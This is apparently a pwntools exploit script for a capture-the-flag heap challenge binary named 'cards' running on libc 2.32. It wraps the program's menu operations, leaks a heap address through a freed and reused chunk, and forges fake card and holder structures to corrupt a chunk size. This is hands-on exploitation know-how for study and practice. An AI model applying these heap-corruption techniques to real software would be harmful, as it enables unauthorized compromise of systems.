from pwn import *

import time
import os
import subprocess


def get_pid(name):
    return list(map(int, subprocess.check_output(["pidof", name]).split()))[0]


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(size, colour, name):
    io.sendlineafter(b'Choice: ', b'1')
    io.sendafter(b'card: ', (b'%d\n' % size)[:3])
    io.sendlineafter(b'color: ', colour)
    io.sendafter(b'name: ', name)
    io.recvuntil(b'Done.')


@debug
def remove(index):
    io.sendlineafter(b'Choice: ', b'2')
    io.sendlineafter(b'card: ', b'%d' % index)


@debug
def edit(index, name):
    io.sendlineafter(b'Choice: ', b'3')
    io.sendlineafter(b'card: ', b'%d' % index)
    io.sendlineafter(b'name: ', name)


@debug
def view(index):
    io.sendlineafter(b'Choice: ', b'4')
    io.sendlineafter(b'card: ', b'%d' % index)
    io.recvuntil(b'No: ')
    id_ = int(io.recvuntil(b'.')[:-1])
    io.recvuntil(b'Size: ')
    size = int(io.recvuntil(b'.')[:-1])
    io.recvuntil(b'name: ')
    name = io.recvuntil(b'.')[:-1]
    return (id_, size, name)


binpath = './cards'
elf = ELF(binpath)
libcpath = './libc-2.32.so'
libc = ELF(libcpath)

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = "DEBUG"


gdbscript = '''
gef
set $cards=0x7ffff7dd2140
c
b *0x7ffff7bd11ef
# b *0x7ffff7bd11e3
c
'''
io = gdb.debug(['./ld-2.32.so', '--library-path', './', './cards'], aslr=False, gdbscript=gdbscript)
os.kill(get_pid('gdb'), signal.SIGINT)
# io = process(['./ld-2.32.so', '--library-path', './', './cards'])

# struct card -> struct holder -> char *name

add(0x28, b'A', b'B')  # 0
remove(0)
add(0x28, b'C', b'D' * 0x10)  # 1
_, _, data = view(1)
addr_heap = u64(data[0x10:0x17].ljust(8, b'\x00')) - 0x2d0
print('addr_heap = 0x{:x}'.format(addr_heap))

addr_fake_chunk_user_land = addr_heap + 0x390
fake_card = b''
fake_card += p64(0)
fake_card += p64(0xdeadbeef)  # color
fake_card += p64(addr_fake_chunk_user_land)  # pointer to struct holder
fake_card += p64(1)  # flag?
edit(1, fake_card)
fake_holder = b''
fake_holder += p64(0x500)
fake_holder += p64(0)
fake_holder += p64(addr_fake_chunk_user_land - 0x8)  # point name to fake chunk size itself
add(0xf8, b'E', fake_holder)  # 2, write fake_hoder, later fake chunk will be written here

fake_chunk = b''
fake_chunk += p64(0x421)  # size
edit(0, fake_chunk)

add(0xf8, b'F', b'G')
add(0xf8, b'H', b'I')
add(0xf8, b'J', b'K')

io.interactive()
